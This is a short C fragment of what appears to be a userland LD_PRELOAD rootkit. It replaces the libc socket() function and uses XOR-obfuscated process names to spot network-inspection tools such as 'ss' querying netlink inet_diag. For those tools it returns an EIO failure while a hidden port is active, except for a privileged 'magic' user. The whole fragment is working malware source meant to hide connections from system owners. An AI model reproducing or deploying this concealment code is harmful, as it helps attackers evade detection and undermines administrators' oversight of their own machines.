int ssme(int domain, int protocol){
    if(domain != AF_NETLINK || protocol != NETLINK_INET_DIAG)
        return 0;
    for(size_t i = 0; i < SS_PROCESS_NAMES_SIZE; i++){
        char *procname = xordup(ss_process_names[i]);
        if(procname){
            int cm = cmpproc(procname);
            clean(procname);
            if(cm) return 1;
        }
    }
    return 0;
}
int socket(int domain, int type, int protocol){
    if(!magicusr() && ssme(domain, protocol) && is_hideport_alive){
        errno = EIO;
        return -1;
    }
    hook(CSOCKET);
    return (long)call(CSOCKET, domain, type, protocol);
}